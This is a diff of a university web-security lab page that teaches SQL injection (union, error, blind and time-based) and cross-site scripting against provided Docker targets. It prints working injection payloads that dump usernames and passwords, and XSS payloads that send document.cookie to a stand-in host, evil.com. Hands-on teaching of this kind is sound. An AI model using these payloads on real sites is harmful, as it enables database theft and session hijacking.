@@ -1,29 +1,29 @@
 # Lab 6: Web Security (NOT READY)
 
 {% hint style="danger" %}
-READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.&#x20;
+READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
 {% endhint %}
 
----
+***
 
 ## 6.0.0 Introduction
 
 SQL injection (SQLi) and Cross Site Scripting (XSS) are a type of **injection (AS03:2021)** vulnerability that have been listed as one of the top 10 web application security risks by OWASP ([OWASP Top 10](https://owasp.org/www-project-top-ten/)). This lab will explore these two types of vulnerabilities on vulnerable web applications and explain how to detect these vulnerabilities via source code review and black box testing.
 
----
+***
 
-## 6.1.0  SQLi
+## 6.1.0 SQLi
 
 A SQLi attack injects a malicious SQL query via input data from the client to the web application. If a website does not securely sanitise user inputs being inserted into a SQL query, then an attacker can malform the query to perform additional operations that were never intended.
 
 For this section, we will explore how SQLi vulnerabilities can occur, how to exploit the follow types of SQLi attacks and using tools such as `sqlmap` to automatically discover and exploit SQLi vulnerabilities.
 
-- Union-based SQLi
-- Error-based SQLi
-- Blind-based SQLi
-- Time-based SQLi
+* Union-based SQLi
+* Error-based SQLi
+* Blind-based SQLi
+* Time-based SQLi
 
----
+***
 
 ### 6.1.1 Union-based SQLi Attacks
 
@@ -33,7 +33,7 @@ This section will explore how to detect Union-based SQLi attack vectors, the met
 
 **Detecting a SQLi attack vector**
 
-The easiest way to see if some input is not properly santised for a SQL query is by sending a single `'` or `"` character. If the website crashes (sends a 500 HTTP status code) then it is a strong indication that the malicious input has caused a SQL syntax error, which caused the website to crash. 
+The easiest way to see if some input is not properly santised for a SQL query is by sending a single `'` or `"` character. If the website crashes (sends a 500 HTTP status code) then it is a strong indication that the malicious input has caused a SQL syntax error, which caused the website to crash.
 
 However, if the web application properly handles errors the page would not return a 500 HTTP status code, making the SQLi attack vector harder to detect. Therefore, a more effective way to detect if an input is vulnerable to SQLi is to first discover an input that always returns a result, then try injecting a SQL conditional and see if the same result returns.
 
@@ -43,16 +43,18 @@ For an example, a web application executes the following SQL query when you sear
 SELECT name, description, amount, price FROM items WHERE name LIKE '{search}'
 ```
 
-*items table*
-| name | description | amount | price |
-| ---- | ----------- | ------ | ----- |
-| milk crate | a milk crate stolen from coles | 20 | 10000 |
-| 1L of 4 year old petrol | some petrol siphoned out of a lawn mower | 13 | 600 |
-| 1g of dirt | literally dirt | 20000 | 999999 |
+_items table_
+
+| name                    | description                              | amount | price  |
+| ----------------------- | ---------------------------------------- | ------ | ------ |
+| milk crate              | a milk crate stolen from coles           | 20     | 10000  |
+| 1L of 4 year old petrol | some petrol siphoned out of a lawn mower | 13     | 600    |
+| 1g of dirt              | literally dirt                           | 20000  | 999999 |
 
 If you just searched `milk crate` on the store then it would only show you the results for the item named `milk crate`. However, if you searched `milk crate' AND '1'='1` and it returns with the same results then you have found the attack vector for exploiting the SQLi vulnerability. This is because the input malforms the query to still search for `milk crate` and insert a SQL `AND` conditional that always returns **true** (the malformed query is shown below). However, if the input was not vulnerable then the DB would of searched for `milk crate' AND '1'='1` and return no results since there are no items with that name.
 
-*The malformed query*
+_The malformed query_
+
 ```sql
 SELECT name, description, amount, price FROM items WHERE name LIKE 'milk crate' AND '1'='1'
 ```
@@ -67,19 +69,19 @@ You can determine the number of columns you need by using `ORDER BY` or `GROUP B
 
 Using the previous `items` example.
 
-- `milk crate' ORDER BY 1--`: Returns the milk crate result
-- `milk crate' ORDER BY 2--`: Returns the milk crate result
-- `milk crate' ORDER BY 3--`: Returns the milk crate result
-- `milk crate' ORDER BY 4--`: Returns the milk crate result
-- `milk crate' ORDER BY 5--`: Returns no results. This is because there is no column with the index 5 in the `items` table and causes an SQL error. Therefore, it indicates that the original query returns 4 columns.
+* `milk crate' ORDER BY 1--`: Returns the milk crate result
+* `milk crate' ORDER BY 2--`: Returns the milk crate result
+* `milk crate' ORDER BY 3--`: Returns the milk crate result
+* `milk crate' ORDER BY 4--`: Returns the milk crate result
+* `milk crate' ORDER BY 5--`: Returns no results. This is because there is no column with the index 5 in the `items` table and causes an SQL error. Therefore, it indicates that the original query returns 4 columns.
 
 An alternative is using the `UNION SELECT` statement with constant values until an error does not occur.
 
-- `milk crate' UNION SELECT 1--`: Returns no results.
-- `milk crate' UNION SELECT 1,2--`: Returns no results.
-- `milk crate' UNION SELECT 1,2,3--`: Returns no results.
-- `milk crate' UNION SELECT 1,2,3,4--`: Returns the milk crate result and a row with the numbers 1, 2, 3 4, and 5.
-- `milk crate' UNION SELECT 1,2,3,4,5--`: Returns no results.
+* `milk crate' UNION SELECT 1--`: Returns no results.
+* `milk crate' UNION SELECT 1,2--`: Returns no results.
+* `milk crate' UNION SELECT 1,2,3--`: Returns no results.
+* `milk crate' UNION SELECT 1,2,3,4--`: Returns the milk crate result and a row with the numbers 1, 2, 3 and 4.
+* `milk crate' UNION SELECT 1,2,3,4,5--`: Returns no results.
 
 **Step 2: Leaking Information About the Database Management System**
 
@@ -109,11 +111,12 @@ To execute these queries for our SQLi attack, we need craft our `UNION SELECT` t
 Once you have discovered the tables and columns you want to dump, you then just rewrite your `UNION SELECT` payload to dump those columns you want to view.
 
 eg.
+
 ```
 ' UNION SELECT username,password,3,4 FROM users--
 ```
 
----
+***
 
 ### 6.1.2 Union-based SQLi Exercise
 
@@ -121,7 +124,7 @@ We will be using `docker compose` for running the servers during this lab. If yo
 
 **If you are using an arm64 processor (eg. M series Macs), then you will need to install `rosetta2` using the command `softwareupdate --install-rosetta`!**
 
-To start this execise, download [docker-compose.sqli_union.yml](./files/lab6/docker-compose-files/docker-compose.sqli_union.yml). If you are using a Mac M series laptop, add `-arm` to the end of the image name or add `platform: linux/amd64` in the YAML file.
+To start this execise, download [docker-compose.sqli\_union.yml](files/lab6/docker-compose-files/docker-compose.sqli\_union.yml). If you are using a Mac M series laptop, add `-arm` to the end of the image name or add `platform: linux/amd64` in the YAML file.
 
 You can start the servers using one of the following commands that will automatically pull the images and start the containers.
 
@@ -129,7 +132,7 @@ You can start the servers using one of the following commands that will automati
 docker compose -f docker-compose.sqli_union.yml up
 ```
 
-or 
+or
 
 ```
 docker compose -f docker-compose.sqli_union.yml up
@@ -145,7 +148,7 @@ To complete this exercise, you need to exploit the SQLi union-based vulnerabilit
 
 **Using `sqlmap` is not allowed!**
 
----
+***
 
 ### 6.1.3 Error-based SQLi Attacks
 
@@ -159,11 +162,11 @@ For MySQL servers, the **`updatexml`** is a useful functioning for causing an SQ
 ' AND updatexml(null,concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 1,1)),null)--
 ```
 
----
+***
 
 ### 6.1.4 Error-based SQLi Exercise
 
-For this execise, download [docker-compose.sqli_error.yml](./files/lab6/docker-compose-files/docker-compose.sqli_error.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.sqli\_error.yml](files/lab6/docker-compose-files/docker-compose.sqli\_error.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.sqli_error.yml up
@@ -173,7 +176,7 @@ To complete this exercise, demonstrate to your lab facilitator exploiting the vu
 
 **Using `sqlmap` is not allowed!**
 
----
+***
 
 ### 6.1.5 Blind-based SQLi Attacks
 
@@ -230,17 +233,17 @@ milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIM
 
 There is one issue with this approach. For MySQL, string searches for nonbinary strings (`CHAR`, `VARCHAR` and `TEXT`) use the collation of the comparison operands and are **case insensitive**! However, binary strings (`BINARY`, `VARBINARY` and `BLOB`) compare the numeric values of the bytes and the comparison is **case sensitive**. The following exercise would be constructing a Blind-based SQLi payload that is **case sensitive**.
 
----
+***
 
 ### 6.1.6 Blind-based SQLi Exercise
 
-For this execise, download [docker-compose.sqli_blind.yml](./files/lab6/docker-compose-files/docker-compose.sqli_blind.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.sqli\_blind.yml](files/lab6/docker-compose-files/docker-compose.sqli\_blind.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.sqli_blind.yml up
 ```
 
-Since SQLi blind-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](./files/lab6/provided-files/sqli_blind_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.
+Since SQLi blind-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](files/lab6/provided-files/sqli\_blind\_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.
 
 You will get 2 marks for demonstrating the following tasks to your lab facilitator:
 
@@ -249,7 +252,7 @@ You will get 2 marks for demonstrating the following tasks to your lab facilitat
 
 **The flag has to match the correct case! So be careful how you construct your SQLi payload.**
 
---- 
+***
 
 ### 6.1.7 Time-based SQLi Attacks
 
@@ -261,17 +264,17 @@ In SQL you can write an **if** statement using the MySQL function `IF`. The belo
 ' AND IF(substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 2, 1)='a', SLEEP(3), 0)--
 ```
 
----
+***
 
 ### 6.1.8 Time-based SQLi Exercise
 
-For this execise, download [docker-compose.sqli_time.yml](./files/lab6/docker-compose-files/docker-compose.sqli_time.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.sqli\_time.yml](files/lab6/docker-compose-files/docker-compose.sqli\_time.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.sqli_time.yml up
 ```
 
-Since SQLi time-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](./files/lab6/provided-files/sqli_blind_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.
+Since SQLi time-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](files/lab6/provided-files/sqli\_blind\_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.
 
 You will get 2 marks for demonstrating the following tasks to your lab facilitator:
 
@@ -280,13 +283,13 @@ You will get 2 marks for demonstrating the following tasks to your lab facilitat
 
 **The flag has to match the correct case! So be careful how you construct your SQLi payload.**
 
----
+***
 
 ## 6.2.0 XSS Attacks
 
 XSS attacks exploit a HTML injection vulnerability that executes malicious javascript that can access a victim's cookies, session tokens or other sensitive information from a trusted source. This lab we will explore exploiting client-side XSS vulnerabilities.
 
----
+***
 
 ### 6.2.1 Exploiting a Basic XSS Vulnerability
 
@@ -317,11 +320,11 @@ However, if the session cookies have `HttpOnly` attribute set to `true` you can 
 </script>
 ```
 
----
+***
 
 ### 6.2.2 Basic XSS Attack Exercise
 
-For this execise, download [docker-compose.xss_basic.yml](./files/lab6/docker-compose-files/docker-compose.xss_basic.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.xss\_basic.yml](files/lab6/docker-compose-files/docker-compose.xss\_basic.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.xss_basic.yml up
@@ -335,7 +338,7 @@ python3 -m http.server 80
 
 To complete this exercise, demonstrate to the lab facilitator exfiltrating the admin's cookie by exploiting the XSS vulnerability.
 
----
+***
 
 ### 6.2.3 Exploiting XSS Using Other HTML Tags
 
@@ -354,11 +357,11 @@ Below are a list of other XSS payloads using other HTML tags besides `<script>` 
 <video src=_ onloadstart="window.location='https://evil.com/?nomnom='+document.cookie" />
 ```
 
----
+***
 
 ### 6.2.4 XSS Using Other HTML Tags Exercise
 
-For this execise, download [docker-compose.xss_alt_tag.yml](./files/lab6/docker-compose-files/docker-compose.xss_alt_tag.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.xss\_alt\_tag.yml](files/lab6/docker-compose-files/docker-compose.xss\_alt\_tag.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.xss_alt_tag.yml up
@@ -366,7 +369,7 @@ docker compose -f docker-compose.xss_alt_tag.yml up
 
 To complete this exercise, demonstrate to the lab facilitator exfiltrating the admin's cookie by exploiting the XSS vulnerability without the `<script>` HTML tag.
 
----
+***
 
 ### 6.2.3 Bypassing Content Security Policy Protections
 
@@ -391,11 +394,11 @@ However, an attacker can bypass the above CSP since it does not specify exact Ja
 
 [HackTricks documents a large variety of methods for bypassing Content-Security-Policy headers using third party endpoints.](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
 
----
+***
 
 ### 6.2.5 Bypassing CSP Exercise
 
-For this execise, download [docker-compose.xss_csp.yml](./files/lab6/docker-compose-files/docker-compose.xss_csp.yml) and run the Docker containers using the following command.
+For this execise, download [docker-compose.xss\_csp.yml](files/lab6/docker-compose-files/docker-compose.xss\_csp.yml) and run the Docker containers using the following command.
 
 ```
 docker compose -f docker-compose.xss_csp.yml up
@@ -411,6 +414,6 @@ You need to research a method to exploit the XSS vulnerability with this CSP and
 
 1. The CSP prevents exfiltrating data using `fetch`.
 2. One of the allowed sources has a JSONP endpoint that you can use in your exploit.
-3. If you have the correct method but it is not working, **make sure you a properly URL encoding your payload**! For an example, the `+` in a URL decodes to ` `.
+3. If you have the correct method but it is not working, **make sure you a properly URL encoding your payload**! For an example, the `+` in a URL decodes to .
 
----
+***
